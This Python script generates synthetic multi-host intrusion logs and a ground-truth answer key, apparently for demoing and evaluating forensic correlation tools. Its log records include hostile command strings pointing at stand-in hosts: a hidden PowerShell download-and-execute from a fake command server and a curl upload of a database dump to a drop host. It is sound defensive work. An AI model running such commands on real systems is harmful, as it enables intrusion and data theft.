"""Synthetic multi-device intrusion with ground truth, for demos and evaluation."""

import json
import random
from datetime import UTC, datetime, timedelta
from pathlib import Path

T0 = datetime(2025, 3, 10, 9, 0, 0, tzinfo=UTC)
MON = "Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split()

DEVICES = {
    "ws01": {"ip": "10.0.0.11", "tz_offset_min": 0, "skew_s": 0.0, "skew_unc_s": 2.0},
    "ws02": {"ip": "10.0.0.12", "tz_offset_min": 0, "skew_s": 8.0, "skew_unc_s": 5.0},
    "srv01": {"ip": "10.0.0.21", "tz_offset_min": 0, "skew_s": 40.0, "skew_unc_s": 6.0},
    "db01": {"ip": "10.0.0.31", "tz_offset_min": 60, "skew_s": -25.0, "skew_unc_s": 6.0},
    "proxy01": {"ip": "10.0.0.2", "tz_offset_min": 0, "skew_s": 0.0, "skew_unc_s": 1.0},
    "fw01": {"ip": "10.0.0.1", "tz_offset_min": 0, "skew_s": 3.0, "skew_unc_s": 2.0},
    "dns01": {"ip": "10.0.0.3", "tz_offset_min": 0, "skew_s": 0.0, "skew_unc_s": 1.0},
}
KNOWN = ["microsoft.com", "github.com", "ubuntu.com", "corp.local"]
BENIGN_SITES = ["www.microsoft.com", "github.com", "archive.ubuntu.com", "wiki.corp.local"]
C2, DROP = "evil-cdn.example", "files-drop.example"


class _Gen:
    def __init__(self, seed):
        self.rng = random.Random(seed)
        self.rows = {}
        self.actual = {n: d["skew_s"] + self.rng.uniform(-2, 2) for n, d in DEVICES.items()}

    def _local(self, dev, utc):
        d = DEVICES[dev]
        return utc + timedelta(minutes=d["tz_offset_min"], seconds=self.actual[dev])

    def _epoch(self, dev, utc):
        return (utc + timedelta(seconds=self.actual[dev])).timestamp()

    def _add(self, fname, utc, text, key=None):
        self.rows.setdefault(fname, []).append((utc, text, key))
        return (fname, utc, text)

    def at(self, s):
        return T0 + timedelta(seconds=s + self.rng.uniform(-0.4, 0.4))

    def auth(self, dev, s, ok, user, ip, pid):
        utc = self.at(s)
        l = self._local(dev, utc)
        verdict = "Accepted publickey" if ok else "Failed password"
        text = (
            f"{MON[l.month - 1]} {l.day:2d} {l:%H:%M:%S} {dev} sshd[{pid}]: "
            f"{verdict} for {user} from {ip} port {self.rng.randint(30000, 60000)} ssh2"
        )
        return self._add(f"{dev}.auth.log", utc, text)

    def proc(self, dev, s, image, cmd, user, pid, ppid):
        utc = self.at(s)
        rec = {
            "time": f"{self._local(dev, utc):%Y-%m-%dT%H:%M:%S}",
            "host": dev,
            "image": image,
            "cmd": cmd,
            "user": user,
            "pid": pid,
            "ppid": ppid,
        }
        return self._add(f"{dev}.proc.jsonl", utc, json.dumps(rec))

    def proxy(self, s, ip, user, method, domain, path, nbytes):
        utc = self.at(s)
        text = f"{self._epoch('proxy01', utc):.3f},{ip},{user},{method},{domain},{path},{nbytes}"
        return self._add("proxy01.proxy.csv", utc, text)

    def dns(self, s, ip, name):
        utc = self.at(s)
        return self._add("dns01.dns.log", utc, f"{self._epoch('dns01', utc):.3f} query client={ip} name={name}")

    def fw(self, s, src, dst, port, nbytes=900, action="ALLOW"):
        utc = self.at(s)
        l = self._local("fw01", utc)
        text = f"{l:%Y-%m-%dT%H:%M:%S} fw01 SRC={src} DST={dst} DPT={port} ACTION={action} BYTES={nbytes}"
        return self._add("fw01.fw.log", utc, text)

    def write(self, out):
        out = Path(out)
        out.mkdir(parents=True, exist_ok=True)
        ids = {}
        for fname, rows in self.rows.items():
            rows.sort(key=lambda r: r[0])
            lines = []
            if fname.endswith(".proxy.csv"):
                lines.append("epoch,client,user,method,domain,path,bytes")
            for utc, text, _ in rows:
                lines.append(text)
                ids[(fname, utc, text)] = f"{fname}:{len(lines)}"
            (out / fname).write_text("\n".join(lines) + "\n", encoding="utf-8")
        return ids


def generate(out, seed=1, noise=1.0):
    g = _Gen(seed)
    r = g.rng
    ip = {n: d["ip"] for n, d in DEVICES.items()}
    truth, beacons = [], []

    truth.append(
        g.proc(
            "ws01",
            10,
            "powershell.exe",
            f'powershell -nop -w hidden -c "iex(irm https://{C2}/s2)"',
            "alice",
            4000,
            3900,
        )
    )
    truth.append(g.dns(11, ip["ws01"], C2))
    truth.append(g.dns(12, ip["ws01"], C2))
    truth.append(g.proxy(13, ip["ws01"], "alice", "GET", C2, "/s2", 40213))
    dropped = r.choice([3, 4, 5])
    for i in range(8):
        if i == dropped:
            continue
        b = g.proxy(130 + 60 * i, ip["ws01"], "alice", "POST", C2, "/beacon", 310)
        truth.append(b)
        beacons.append((i, b))
    truth.append(g.proc("ws01", 300, "ssh.exe", "ssh admin@10.0.0.21", "alice", 4100, 4000))
    truth.append(g.fw(301, ip["ws01"], ip["srv01"], 22))
    truth.append(g.auth("srv01", 302, True, "admin", ip["ws01"], 5200))
    truth.append(g.proc("srv01", 306, "tar", "tar czf /tmp/.stage.tgz /srv/finance", "admin", 5201, 5200))
    truth.append(g.proc("srv01", 420, "ssh", "ssh dbadmin@10.0.0.31", "admin", 5230, 5200))
    db_login = g.auth("db01", 421, True, "dbadmin", ip["srv01"], 7100)
    truth.append(db_login)
    truth.append(g.proc("db01", 430, "tar", "tar czf /tmp/.dump.tgz /var/db", "dbadmin", 7101, 7100))
    truth.append(g.proc("db01", 520, "curl", f"curl -T /tmp/.dump.tgz https://{DROP}/up", "dbadmin", 7102, 7100))
    truth.append(g.dns(521, ip["db01"], DROP))
    truth.append(g.proxy(523, ip["db01"], "dbadmin", "PUT", DROP, "/up", 48_000_000))

    g.proc("ws02", 280, "ssh", "ssh bob@10.0.0.21", "bob", 3100, 1)
    g.fw(284, ip["ws02"], ip["srv01"], 22)
    g.auth("srv01", 285, True, "bob", ip["ws02"], 5150)
    g.proc("srv01", 290, "ls", "ls -la /home/bob", "bob", 5151, 5150)

    n = int(60 * noise)
    for _ in range(n):
        s = r.uniform(-600, 1500)
        who = r.choice([("ws02", "bob"), ("ws02", "carol"), ("ws01", "alice")])
        site = r.choice(BENIGN_SITES)
        g.dns(s - 0.5, ip[who[0]], site)
        g.proxy(s, ip[who[0]], who[1], "GET", site, "/", r.randint(800, 90000))
    for _ in range(int(8 * noise)):
        g.auth(
            "srv01",
            r.uniform(-600, 1500),
            False,
            r.choice(["root", "admin", "test"]),
            "203.0.113.9",
            r.randint(6000, 6900),
        )
    for _ in range(int(10 * noise)):
        g.fw(r.uniform(-600, 1500), ip["proxy01"], f"93.184.216.{r.randint(1, 250)}", 443, r.randint(500, 9000))
    for _ in range(int(10 * noise)):
        d = r.choice(["srv01", "db01"])
        g.proc(d, r.uniform(-600, 1500), "cron", "/usr/sbin/cron -f", "root", r.randint(900, 990), 1)

    ids = g.write(out)
    truth.sort(key=lambda e: e[1])
    out = Path(out)
    key = lambda e: ids[e]  # noqa: E731
    gaps = [
        {"kind": "missing-parent", "ids": [key(truth[0])]},
        {"kind": "missing-flow", "ids": [key(db_login)]},
    ]
    near = [b for i, b in beacons if i in (dropped - 1, dropped + 1)]
    gaps.append({"kind": "missed-beacons", "ids": [key(b) for b in near]})
    (out / "config.json").write_text(
        json.dumps({"default_year": 2025, "known_domains": KNOWN, "devices": DEVICES}, indent=2), encoding="utf-8"
    )
    (out / "truth.json").write_text(
        json.dumps({"events": [key(e) for e in truth], "gaps": gaps}, indent=2), encoding="utf-8"
    )
    return out
